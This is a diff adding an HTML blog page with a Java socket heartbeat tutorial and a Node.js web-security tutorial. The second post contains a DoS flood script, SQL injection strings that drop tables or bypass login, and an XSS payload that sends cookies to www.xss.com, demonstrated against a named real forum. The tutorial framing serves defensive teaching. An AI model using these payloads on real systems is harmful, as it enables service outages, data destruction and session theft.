@@ -1,0 +1,1874 @@
+<!DOCTYPE html>
+<!--[if IE 7]>
+<html class="ie ie7" lang="zh-CN">
+<![endif]-->
+<!--[if IE 8]>
+<html class="ie ie8" lang="zh-CN">
+<![endif]-->
+<!--[if !(IE 7) | !(IE 8)  ]><!-->
+<html lang="zh-CN">
+<!--<![endif]-->
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width" />
+<title>测试足迹 | 一步一个脚印</title>
+<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="pingback" href="http://10.45.19.178/wordpress/xmlrpc.php" />
+<!--[if lt IE 9]>
+<script src="http://10.45.19.178/wordpress/wp-content/themes/twentytwelve/js/html5.js" type="text/javascript"></script>
+<![endif]-->
+<meta name='robots' content='noindex,nofollow' />
+<link rel="alternate" type="application/rss+xml" title="测试足迹 &raquo; Feed" href="http://10.45.19.178/wordpress/?feed=rss2" />
+<link rel="alternate" type="application/rss+xml" title="测试足迹 &raquo; 评论 Feed" href="http://10.45.19.178/wordpress/?feed=comments-rss2" />
+<link rel='stylesheet' id='twentytwelve-fonts-css'  href='http://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700&#038;subset=latin,latin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='twentytwelve-style-css'  href='http://10.45.19.178/wordpress/wp-content/themes/twentytwelve/style.css?ver=3.5.1' type='text/css' media='all' />
+<!--[if lt IE 9]>
+<link rel='stylesheet' id='twentytwelve-ie-css'  href='http://10.45.19.178/wordpress/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
+<![endif]-->
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://10.45.19.178/wordpress/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://10.45.19.178/wordpress/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 3.5.1" />
+<link rel="stylesheet" type="text/css" href="http://10.45.19.178/wordpress/wp-content/plugins/wp-code-highlight/css/wp-code-highlight.css" media="screen" />
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #e6e6e6; background-image: url('http://10.45.19.178/wordpress/wp-content/uploads/2013/01/45103.jpg'); background-repeat: repeat; background-position: top left; background-attachment: scroll; }
+</style>
+</head>
+
+<body class="home blog custom-background custom-font-enabled">
+<div id="page" class="hfeed site">
+	<header id="masthead" class="site-header" role="banner">
+		<hgroup>
+			<h1 class="site-title"><a href="http://10.45.19.178/wordpress/" title="测试足迹" rel="home">测试足迹</a></h1>
+			<h2 class="site-description">一步一个脚印</h2>
+		</hgroup>
+
+		<nav id="site-navigation" class="main-navigation" role="navigation">
+			<h3 class="menu-toggle">菜单</h3>
+			<a class="assistive-text" href="#content" title="跳至内容">跳至内容</a>
+			<div class="nav-menu"><ul><li class="current_page_item"><a href="http://10.45.19.178/wordpress/" title="首页">首页</a></li><li class="page_item page-item-12"><a href="http://10.45.19.178/wordpress/?page_id=12">about</a></li></ul></div>
+		</nav><!-- #site-navigation -->
+
+			</header><!-- #masthead -->
+
+	<div id="main" class="wrapper">
+	<div id="primary" class="site-content">
+		<div id="content" role="main">
+		
+						<a href="http://10.45.19.178/wordpress/?author=16" title="由 cheng.haiming 发布" rel="author">cheng.haiming</a>				
+	<article id="post-316" class="post-316 post type-post status-publish format-standard hentry category-16 tag-java tag-socket tag-20">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=316" title="链向 java socket 进阶话题一： socket 客户端连接管理 的固定链接" rel="bookmark">java socket 进阶话题一： socket 客户端连接管理</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=316#respond" title="《java socket 进阶话题一： socket 客户端连接管理》上的评论"><span class="leave-reply">发表回复</span></a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>(本文需有一定的tcp/ip 基础知识，并对java socket 以及java的多线程有一定的了解)</p>
+<p>前段时间持续集成平台页面需展示每一个代理端执行控制台输出日志，为了减少主控端存储压力，代理端执行日志只存放在代理端所在主机，每次页面日志的获取直接从代理端获取。</p>
+<p>主控和代理端的消息通讯使用java socket，网上关于java socket 基础编程已经存在很多，本文主要探讨 java socket 中的一些延伸性的话题：多代理端同步消息通讯、 socket的分包和粘包，socket 客户端连接管理。</p>
+<p>一、socket 客户端连接管理</p>
+<p>持续集成的主控端必须要时刻监控代理端的状态，如果代理端没有连接需给出告警，而java socket的在不进行心跳控制的情况下无法真正的获取到代理端的状态 java socket 提供的方法 isConnected() 和 isClosed 无法真正的检测出客户端的状态，请看代码：</p>
+<p>socket 服务端代码：</p>
+<pre class="wp-code-highlight prettyprint">package com.test.socket.state;
+
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.util.Date;
+import java.util.concurrent.ConcurrentLinkedQueue;
+
+import com.zsmart.core.common.DateHelper;
+
+/**
+ * socket 服务端
+ * @author chm
+ *
+ */
+public class ServerSocketTest {
+
+    /**存放客户端连接集合*/
+    public static ConcurrentLinkedQueue socketList = new ConcurrentLinkedQueue();
+    /**
+     * 程序入口函数
+     * @param args
+     */
+    public static void main(String[] args) {
+        ServerSocketTest sst = new ServerSocketTest();
+        sst.startMonitor();
+    }
+
+    /**
+     * 监控客户端连接
+     */
+    public  void startMonitor() {
+        try {
+            ServerSocket serverS = new ServerSocket(9912);
+            Thread th = new Thread(new MonitorClientState());
+            th.start();
+            while (true) {
+                Socket socket = serverS.accept();
+                socketList.add(socket);
+            }
+        }
+        catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * 客户端状态监控类
+     * @author chm
+     *
+     */
+    class MonitorClientState implements Runnable {
+
+        public void run() {
+            try {
+                while(true){
+
+                    Thread.sleep(2000);
+                    System.out.println(&quot;exec time: &quot; + DateHelper.date2String(new Date()));
+                    for(Socket socketTemp : socketList){
+                        System.out.println(&quot;ip: &quot; + socketTemp.getInetAddress().getHostAddress() + &quot; -- remote port: &quot; + socketTemp.getPort() 
+                            + &quot; is close: &quot; +  socketTemp.isClosed() + &quot; -- is connected: &quot; + socketTemp.isConnected());
+                    }
+
+                }
+
+            }
+            catch (Exception e) {
+                e.printStackTrace();
+            }
+
+        }
+
+    }
+
+}</pre>
+<p>socket 客户端代码：</p>
+<pre class="wp-code-highlight prettyprint">package com.test.socket.state;
+
+import java.net.Socket;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.List;
+
+import com.zsmart.core.common.DateHelper;
+
+/**
+ * 客户端socket
+ * @author chm
+ *
+ */
+public class ClientSocket {
+
+    public static void main(String[] args) {
+        try {
+
+            List listSocket = new ArrayList();
+            for(int i=0 ;i &amp;lt; 5 ;i++){
+                Socket socket = new Socket(&quot;localhost&quot;, 9912);
+                listSocket.add(socket);
+            }
+            Thread.sleep(4000);
+            Socket socket = listSocket.get(2);
+            socket.close();
+
+            Socket socket1 = listSocket.get(2);
+            socket1.close();
+            socket1 = null;
+            System.out.println(&quot;Exec time: &quot; + DateHelper.date2String(new Date()) + &quot;  设置socket 连接为关闭状态&quot;);
+
+        }
+        catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+}</pre>
+<p>我们在server端开始监听客户端的连接状态，每2秒打印出当前的连接状态，在客户端我们启动5个socket连接，过4 秒后直接关闭其中一个同时销毁一个，<br />
+并且我们的客户端在进行关闭操作后直接退出了，此时socket应用已经不存在了。看一下输出结果：</p>
+<p>exec time: 2014-01-23 15:49:29<br />
+ip: 127.0.0.1 &#8212; remote port: 64538 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64539 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64540 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64541 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64542 is close: false &#8212; is connected: true</p>
+<p>exec time: 2014-01-23 15:49:31<br />
+ip: 127.0.0.1 &#8212; remote port: 64538 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64539 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64540 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64541 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64542 is close: false &#8212; is connected: true</p>
+<p>exec time: 2014-01-23 15:49:33<br />
+ip: 127.0.0.1 &#8212; remote port: 64538 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64539 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64540 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64541 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 64542 is close: false &#8212; is connected: true</p>
+<p>Exec time: 2014-01-23 15:49:30 设置socket 连接为关闭状态</p>
+<p>在客户端设置其中一个socket 连接状态为关闭同时应用程序退出了，此时从server 端获取到的socket 状态依旧为可用状态。</p>
+<p>我们怎么办，如何能真正的获取到socket的连接状态，答案就是：心跳，我们可以这样，在代码中增加如下功能：</p>
+<p>server 端监控代码如下：</p>
+<p>&nbsp;</p>
+<pre class="wp-code-highlight prettyprint">
+public void run() {
+
+            while (true) {
+                Socket socketOut = null;
+                try {
+                    Thread.sleep(2000);
+                    System.out.println(&quot;exec time: &quot; + DateHelper.date2String(new Date()));
+                    for (Socket socketTemp : socketList) {
+                        socketOut = socketTemp;
+                        System.out.println(&quot;ip: &quot; + socketTemp.getInetAddress().getHostAddress() + &quot; -- remote port: &quot;
+                            + socketTemp.getPort() + &quot; is close: &quot; + socketTemp.isClosed() + &quot; -- is connected: &quot;
+                            + socketTemp.isConnected());
+                        
+                       
+                       //心跳，发送消息用来真正的检验客户端是否存在
+                       DataOutputStream dataOut = new DataOutputStream( socketTemp.getOutputStream());
+                       dataOut.writeBytes(&quot;test&quot;);
+                       dataOut.flush();
+                       
+                    }
+
+                    System.out.println(&quot;\n&quot;);
+                }
+                catch (Exception e) {
+                    //出现异常，删除掉出现错误的客户端
+                    socketList.remove(socketOut);
+                    System.out.println(e.getMessage());
+                }
+                    
+            }
+
+        }
+
+</pre>
+<p>客户端代码如下：</p>
+<pre class="wp-code-highlight prettyprint">
+public static void main(String[] args) {
+        try {
+            
+            List listSocket = new ArrayList();
+            for(int i=0 ;i &amp;lt; 5 ;i++){
+                Socket socket = new Socket(&amp;quot;localhost&amp;quot;, 9912);
+                listSocket.add(socket);
+            }
+            Thread.sleep(4000);
+            Socket socket = listSocket.get(2);
+            socket.close();
+            
+            Socket socket1 = listSocket.get(3);
+            socket1.close();
+            socket1 = null;
+            System.out.println(&amp;quot;Exec time: &amp;quot; + DateHelper.date2String(new Date()) + &amp;quot;  设置socket 连接为关闭状态&amp;quot;);
+            
+            Thread.sleep(8000);
+            
+        }
+        catch (Exception e) {
+            e.printStackTrace();
+        }
+        
+    }
+
+</pre>
+<p>server 端增加心跳控制，向代理端发送心跳消息，客户端在设置socket 为关闭后，等待8秒钟然后退出</p>
+<p>结果输出如下：</p>
+<p>exec time: 2014-01-23 18:14:39<br />
+ip: 127.0.0.1 &#8212; remote port: 52669 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52670 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52671 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52674 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52675 is close: false &#8212; is connected: true</p>
+<p>exec time: 2014-01-23 18:14:41<br />
+ip: 127.0.0.1 &#8212; remote port: 52669 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52670 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52671 is close: false &#8212; is connected: true<br />
+Software caused connection abort: socket write error<br />
+exec time: 2014-01-23 18:14:43<br />
+ip: 127.0.0.1 &#8212; remote port: 52669 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52670 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52674 is close: false &#8212; is connected: true<br />
+Software caused connection abort: socket write error<br />
+exec time: 2014-01-23 18:14:45<br />
+ip: 127.0.0.1 &#8212; remote port: 52669 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52670 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52675 is close: false &#8212; is connected: true</p>
+<p>exec time: 2014-01-23 18:14:47<br />
+ip: 127.0.0.1 &#8212; remote port: 52669 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52670 is close: false &#8212; is connected: true<br />
+ip: 127.0.0.1 &#8212; remote port: 52675 is close: false &#8212; is connected: true</p>
+<p>exec time: 2014-01-23 18:14:49<br />
+ip: 127.0.0.1 &#8212; remote port: 52669 is close: false &#8212; is connected: true<br />
+Connection reset by peer: socket write error<br />
+exec time: 2014-01-23 18:14:51<br />
+ip: 127.0.0.1 &#8212; remote port: 52670 is close: false &#8212; is connected: true<br />
+Connection reset by peer: socket write error<br />
+exec time: 2014-01-23 18:14:53<br />
+ip: 127.0.0.1 &#8212; remote port: 52675 is close: false &#8212; is connected: true<br />
+Connection reset by peer: socket write error<br />
+exec time: 2014-01-23 18:14:55</p>
+<p>exec time: 2014-01-23 18:14:57</p>
+<p>Exec time: 2014-01-23 18:14:40  设置socket 连接为关闭状态</p>
+<p>从日志可以看出，在设置了第二个和第三个socket 为关闭状态后，server通过发送心跳消息，成功的判断客户端失去连接，这样就可以近似实时的判断<br />
+出代理端连接状态，当然你可以在查询某个连接的状态时，直接发送消息进行判断代理端的连接状态。</p>
+					</div><!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			本条目发布于 <a href="http://10.45.19.178/wordpress/?p=316" title="18:44" rel="bookmark"><time class="entry-date" datetime="2014-01-23T18:44:59+00:00">2014/01/23</time></a>。属于 <a href="http://10.45.19.178/wordpress/?cat=16" title="查看 技术讨论 中的全部文章" rel="category">技术讨论</a> 分类，被贴了 <a href="http://10.45.19.178/wordpress/?tag=java" rel="tag">java</a>、<a href="http://10.45.19.178/wordpress/?tag=socket" rel="tag">socket</a>、<a href="http://10.45.19.178/wordpress/?tag=%e5%a4%9a%e7%ba%bf%e7%a8%8b" rel="tag">多线程</a> 标签。<span class="by-author">作者是 <span class="author vcard"><a class="url fn n" href="http://10.45.19.178/wordpress/?author=16" title="查看所有由 cheng.haiming 发布的文章" rel="author">cheng.haiming</a></span>。</span>								</footer><!-- .entry-meta -->
+	</article><!-- #post -->
+			<a href="http://10.45.19.178/wordpress/?author=13" title="由 chen.hua6 发布" rel="author">chen.hua6</a>				
+	<article id="post-312" class="post-312 post type-post status-publish format-standard hentry category-uncategorized">
+				<header class="entry-header">
+									<h1 class="entry-title">
+				<a href="http://10.45.19.178/wordpress/?p=312" title="链向 \web安全实战 的固定链接" rel="bookmark">\web安全实战</a>
+			</h1>
+										<div class="comments-link">
+					<a href="http://10.45.19.178/wordpress/?p=312#comments" title="《?web安全实战》上的评论">1 条回复</a>				</div><!-- .comments-link -->
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>前言<br />
+本章将主要介绍使用Node.js开发web应用可能面临的安全问题，读者通过阅读本章可以了解web安全的基本概念，并且通过各种防御措施抵御一些常规的恶意攻击，搭建一个安全的web站点。</p>
+<p>在学习本章之前，读者需要对HTTP协议、SQL数据库、Javascript有所了解。</p>
+<p>?什么是web安全<br />
+在互联网时代，数据安全与个人隐私受到了前所未有的挑战，我们作为网o站开发者，必须让一个web站点满足基本的安全三要素：</p>
+<p>（1）机密性，要求保护数据内容不能泄露，加密是实现机密性的常用手段。</p>
+<p>（2）完整性，要求用户获取的数据是完整不被篡改的，我们知道很多OAuth协议要求进行sign签名，就是保证了双方数据的完整性。</p>
+<p>（3）可用性，保证我们的web站点是可被访问的，网站功能是正常运营的，常见DoS（Denail of Service 拒绝服务）攻击就是破坏了可用性这一点。</p>
+<p>?安全的定义和意识<br />
+web安全的定义根据攻击手段来分，我们把它分为如下两类：</p>
+<p>（1）服务安全，确保网络设备的安全运行，提供有效的网络服务。</p>
+<p>（2）数据安全，确保在网上传输数据的保密性、完整性和可用性等。</p>
+<p>我们之后要介绍的SQL注入，XSS攻击等都是属于数据安全的范畴，DoS，Slowlori攻击等都是属于服务安全范畴。</p>
+<p>在黑客世界中，用帽子的颜色比喻黑客的“善恶”，精通安全技术，工作在反黑客领域的安全专家我们称之为白帽子，而黑帽子则是利用黑客技术谋取私利的犯罪群体。同样都是搞网络安全研究，黑、白帽子的职责完全不同，甚至可以说是对立的。对于黑帽子而言，他们只要找到系统的一个切入点就可以达到入侵破坏的目的，而白帽子必须将自己系统所有可能被突破的地方都设防，保证系统的安全运行。所以我们在设计架构的时候就应该有安全意识，时刻保持清醒的头脑，可能我们的web站点100处都布防很好，只有一个点疏忽了，攻击者就会利用这个点进行突破，让我们另外100处的努力也白费。</p>
+<p>同样安全的运营也是非常重要的，我们为web站点建立起坚固的壁垒，而运营人员随意使用root帐号，给核心服务器开通外网访问IP等等一系列违规操作，会让我们的壁垒瞬间崩塌。</p>
+<p>?Node.js中的web安全<br />
+Node.js作为一门新型的开发语言，很多开发者都会用它来快速搭建web站点，期间随着版本号的更替也修复了不少漏洞。因为Node.js提供的网络接口较PHP更为底层，同时没有如apache、nginx等web服务器的前端保护，Node.js应该更加关注安全方面的问题。</p>
+<p>?Http管道洪水漏洞<br />
+在Node.js版本0.8.26和0.10.21之前，都存在一个管道洪水的拒绝服务漏洞（pipeline flood DoS）。官网在发布这个漏洞修复代码之后，强烈建议在生产环境使用Node.js的版本升级到0.8.26和0.10.21，因为这个漏洞威力巨大，攻击者可以用很廉价的普通PC轻易的击溃一个正常运行的Node.js的HTTP服务器。</p>
+<p>这个漏洞产生的原因很简单，主要是因为客户端不接收服务端的响应，但客户端又拼命发送请求，造成Node.js的Stream流无法泄洪，主机内存耗尽而崩溃，官网给出的解释如下：</p>
+<p>当在一个连接上的客户端有很多HTTP请求管道，并且客户端没有读取Node.js服务器响应的数据，Node.js的服务将可能被击溃。强烈建议任何在生产环境下的版本是0.8或0.10的HTTP服务器都尽快升级。新版本Node.js修复了问题，当服务端在等待stream流的drain事件时，socket和HTTP解析将会停止。在攻击脚本中，socket最终会超时，并被服务端关闭连接。如果客户端并不是恶意攻击，只是发送大量的请求，但是响应非常缓慢，那么服务端响应的速度也会相应降低。</p>
+<p>现在让我们看一下这个漏洞造成的杀伤力吧，我们在一台4cpu，4G内存的服务器上启动一个Node.js的HTTP服务，Node.js版本为0.10.7。服务器脚本如下：</p>
+<p>var http = require(&#8216;http&#8217;);<br />
+var buf = new Buffer(1024*1024);//1mb buffer<br />
+buf.fill(&#8216;h&#8217;);<br />
+http.createServer(function (request, response) {<br />
+response.writeHead(200, {&#8216;Content-Type&#8217;: &#8216;text/plain&#8217;});<br />
+response.end(buf);<br />
+}).listen(8124);<br />
+console.log(process.memoryUsage());<br />
+setInterval(function(){//per minute memory usage<br />
+console.log(process.memoryUsage());<br />
+},1000*60)<br />
+上述代码我们启动了一个Node.js服务器，监听8124端口，响应1mb的字符h，同时每分钟打印Node.js内存使用情况，方便我们在执行攻击脚本之后查看服务器的内存使用情况。</p>
+<p>在另外一台同样配置的服务器上启动如下攻击脚本：</p>
+<p>var net = require(&#8216;net&#8217;);<br />
+var attack_str = &#8216;GET / HTTP/1.1\r\nHost: 192.168.28.4\r\n\r\n&#8217;<br />
+var i = 1000000;//10W次的发送<br />
+var client = net.connect({port: 8124, host:&#8217;192.168.28.4&#8242;},<br />
+function() { //&#8217;connect&#8217; listener<br />
+while(i&#8211;){<br />
+client.write(attack_str);<br />
+}<br />
+});<br />
+client.on(&#8216;error&#8217;, function(e) {<br />
+console.log(&#8216;attack success&#8217;);<br />
+});<br />
+我们的攻击脚本加载了net模块，然后定义了一个基于HTTP协议的GET方法的请求头，然后我们使用tcp连接到Node.js服务器，循环发送10W次GET请求，但是不监听服务端响应事件，也就无法对服务端响应的stream流进行消费。下面是在攻击脚本启动10分钟后，web服务器打印的内存使用情况：</p>
+<p>{ rss: 10190848, heapTotal: 6147328, heapUsed: 2632432 }<br />
+{ rss: 921882624, heapTotal: 888726688, heapUsed: 860301136 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189239056 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189251728 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189263768 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189270888 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189278008 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189285096 }<br />
+{ rss: 1250885632, heapTotal: 1211065584, heapUsed: 1189292216 }<br />
+{ rss: 1250893824, heapTotal: 1211065584, heapUsed: 1189301864 }<br />
+我们在服务器执行top命令，查看的系统内存使用情况如下：</p>
+<p>Mem: 3925040k total, 3290428k used, 634612k free, 170324k buffers<br />
+可以看到，我们的攻击脚本只用了一个socket连接就消耗掉大量服务器的内存，更可怕的是这部分内存不会自动释放，需要手动重启进程才能回收。攻击脚本执行之后Node.js进程占用内存比之前提高近200倍，如果有2-3个恶意攻击socket连接，服务器物理内存必然用完，然后开始频繁的交换，从而失去响应或者进程崩溃。</p>
+<p>?SQL注入<br />
+从1998年12月SQL注入首次进入人们的视线，至今已经有十几年了，虽然我们已经有了很全面的防范SQL注入的对策，但是它的威力仍然不容小觑。</p>
+<p>?注入技巧<br />
+SQL注入大家肯定不会陌生，下面就是一个典型的SQL注入示例：</p>
+<p>var userid = req.query["userid"];<br />
+var sqlStr = &#8216;select * from user where id=&#8221;&#8216;+ userid +&#8217;&#8221;&#8216;;<br />
+connection.query(sqlStr, function(err, userObj) {<br />
+// &#8230;<br />
+});<br />
+正常情况下，我们都可以得到正确的用户信息，比如用户通过浏览器访问/user/info?id=11进入个人中心，而我们根据用户传递的id参数展现此用户的详细信息。但是如果有恶意用户的请求地址为/user/info?id=11&#8243;;drop table user&#8211;，那么最后拼接而成的SQL查询语句就是：</p>
+<p>select * from user where id = &#8220;11&#8243;;drop table user&#8211;<br />
+注意最后连续的两个减号表示忽略此SQL语句后面的语句。原本执行的查询用户信息的SQL语句，在执行完毕之后会把整个user表丢弃掉。</p>
+<p>这是另外一个简单的注入示例，比如用户的登录接口查询，我们会根据用户的登录名和密码去数据库查找匹配，如果找到相应的记录，则表示用户名和密码匹配，提示用户登录成功；如果没有找到记录，则认为用户名或密码错误，表示登录失败，代码如下：</p>
+<p>var username = req.body["username"];<br />
+var password = md5(req.body["password"]+salt);//对密码加密<br />
+var sqlStr = &#8216;select * from user where username=&#8221;&#8216;+ username +&#8217;&#8221; and password=&#8221;&#8216;+ password +&#8217;&#8221;;<br />
+如果我们提交上来的用户名参数是这样的格式：snoopy&#8221; and 1=1&#8211;，那么拼接之后的SQL查询语句就是如下内容：</p>
+<p>select * from user where username = &#8220;snoopy&#8221; and 1=1&#8211; &#8221; and password=&#8221;698d51a19d8a121ce581499d7b701668&#8243;;<br />
+执行这样的SQL语句永远会匹配到用户数据，就算我们不知道密码也能顺利登录到系统。如果在我们尝试注入SQL的网站开启了错误提示显示，会为攻击者提供便利，比如攻击者通过反复调整发送的参数、查看错误信息，就可以猜测出网站使用的数据库和开发语言等信息。</p>
+<p>比如有一个信息发布网站，它的新闻详细页面url地址为/news/info?id=11，我们通过分别访问/news/info?id=11 and 1=1和/news/info?id=11 and 1=2，就可以基本判断此网站是否存在SQL注入漏洞，如果前者可以访问而后者页面无法正常显示的话，那就可以断定此网站是通过如下的SQL来查询某篇新闻内容的：</p>
+<p>var sqlStr = &#8216;select * from news where id=&#8221;&#8216;+id+&#8217;&#8221;&#8216;;<br />
+因为1=2这个表达式永远不成立，所以就算id参数正确也无法通过此SQL语句返回真正的数据，当然就会出现无法正常显示页面的情况。我们可以使用一些检测SQL注入点的工具来扫描一个网站哪些地方具有SQL注入的可能。</p>
+<p>通过url参数和form表单提交的数据内容，开发者通常都会为之做严密防范，开发人员必定会对用户提交上来的参数做一些正则判断和过滤，再丢到SQL语句中去执行。但是开发人员可能不太会去关注用户HTTP的请求头，比如cookie中存储的用户名或者用户id，referer字段以及User-Agent字段。</p>
+<p>比如，有的网站可能会去记录注册用户的设备信息，通常记录用户设备信息是根据请求头中的User-Agent字段来判断的，拼接如下查询字符串就有存在SQL注入的可能。</p>
+<p>var username = escape(req.body["username"]);//使用escape函数，过滤SQL注入<br />
+var password = md5(req.body["password"]+salt);//对密码加密<br />
+var agent = req.header["user-agent"];//注意Node.js的请求头字段都是小写的<br />
+var sqlStr = &#8216;insert into user username,password,agent values &#8220;&#8216;+username+&#8217;&#8221;, &#8220;&#8216;+password+&#8217;&#8221;, &#8220;&#8216;+agent+&#8217;&#8221;&#8216;;<br />
+这时候我们通过发包工具，伪造HTTP请求头，如果将请求头中的User-Agent修改为：&#8217;;drop talbe user&#8211;，我们就成功注入了网站。</p>
+<p>?防范措施<br />
+防范SQL注入的方法很简单，只要保证我们拼接到SQL查询语句中的变量都经过escape过滤函数，就基本可以杜绝注入了，所以我们一定要养成良好的编码习惯，对客户端请求过来的任何数据都要持怀疑态度，将它们过滤之后再丢到SQL语句中去执行。我们也可以使用一些比较成熟的ORM框架，它们会帮我们阻挡掉SQL注入攻击。</p>
+<p>?XSS脚本攻击<br />
+XSS是什么？它的全名是：Cross-site scripting，为了和CSS层叠样式表区分，所以取名XSS。它是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML标签以及用户端脚本语言。</p>
+<p>?名城苏州网站注入<br />
+XSS注入常见的重灾区是社交网站和论坛，越是让用户自由输入内容的地方，我们就越要关注其能否抵御XSS攻击。XSS注入的攻击原理很简单，构造一些非法的url地址或js脚本让HTML标签溢出，从而造成注入。一般引诱用户点击才触发的漏洞我们称为反射性漏洞，用户打开页面就触发的称为注入型漏洞，当然注入型漏洞的危害更大一些。下面先用一个简单的实例来说明XSS注入无处不在。</p>
+<p>名城苏州（www.2500sz.com)，是苏州本地门户网站，日均的pv数也达到了150万，它的论坛用户数很多，是本地化新闻、社区论坛做的比较成功的一个网站。</p>
+<p>接下来我们将演示一个注入到2500sz.com的案例，我们先注册成一个2500sz.com站点会员，进入论坛板块，开始发布新帖。打开发帖页面，在web编辑器中输入如下内容：</p>
+<p>&nbsp;</p>
+<p>上面的代码即为分享一个网络图片，我们在图片的src属性中直接写入了javascript:alert(&#8216;xss&#8217;);，操作成功后生成帖子，用IE6、7的用户打开此帖子就会出现下图的alert(&#8216;xss&#8217;)弹窗。</p>
+<p>当然我们要将标题设计的非常夺人眼球，比如“Pm2.5雾霾真相披露” ，然后将里面的alert换成如下恶意代码：</p>
+<p>location.href=&#8217;http://www.xss.com?cookie=&#8217;+document.cookie；<br />
+这样我们就获取到了用户cookie的值，如果服务端session设置过期很长的话，以后就可以伪造这个用户的身份成功登录而不再需要用户名密码，关于session和cookie的关系我们在下一节中将会详细讲到。这里的location.href只是出于简单，如果做了跳转这个帖子很快会被管理员删除，但我们写如下代码，并且帖子的内容也是真实的，那么就会祸害很多人：</p>
+<p>var img = document.createElement(&#8216;img&#8217;);<br />
+img.src=&#8217;http://www.xss.com?cookie=&#8217;+document.cookie;<br />
+img.style.display=&#8217;none&#8217;;<br />
+document.getElementsByTagName(&#8216;body&#8217;)[0].appendChild(img);<br />
+这样就神不知鬼不觉的把当前用户cookie的值发送到恶意站点，恶意站点通过GET参数，就能获取用户cookie的值。通过这个方法可以拿到用户各种各样的私密数据。</p>
+<p>?Ajax的XSS注入<br />
+另一处容易造成XSS注入的地方是Ajax的不正确使用。</p>
+<p>比如有这样的一个场景，在一篇博文的详细页，很多用户给这篇博文留言，为了加快页面加载速度，项目经理要求先显示博文的内容，然后通过Ajax去获取留言的第一页信息，留言功能通过Ajax分页保证了页面的无刷新和快速加载，此做法的好处有：</p>
+<p>（1）加快了博文详细页的加载，提升了用户体验，因为留言信息往往有用户头像、昵称、id等等，需要多表查询，且一般用户会先看博文，再拉下去看留言，这时留言已加载完毕。</p>
+<p>（2）Ajax的留言分页能更快速响应，用户不必每次分页都让博文重新刷新。</p>
+<p>于是前端工程师从PHP那获取了json数据之后，将数据放入DOM文档中，大家能看出下面代码的问题吗？</p>
+<p>var commentObj = $(&#8216;#comment&#8217;);<br />
+$.get(&#8216;/getcomment&#8217;, {r:Math.random(),page:1,article_id:1234},function(data){<br />
+//通过Ajax获取评论内容，然后将品论的内容一起加载到页面中<br />
+if(data.state !== 200) return commentObj.html(&#8216;留言加载失败。&#8217;)<br />
+commentObj.html(data.content);<br />
+},&#8217;json&#8217;);<br />
+我们设计的初衷是，PHP程序员将留言内容套入模板，返回json格式数据，示例如下：</p>
+<p>{&#8220;state&#8221;:200, &#8220;content&#8221;:&#8221;模板的字符串片段&#8221;}<br />
+如果没有看出问题，大家可以打开firebug或者chrome的开发人员工具，直接把下面代码粘贴到有JQuery插件的网站中运行：</p>
+<p>$(&#8216;div:first&#8217;).html(&#8216;</p>
+<div>alert(&#8220;xss&#8221;)</p>
+<div>&#8216;);<br />
+正常弹出了alert框，你可能觉得这比较小儿科。</div>
+</div>
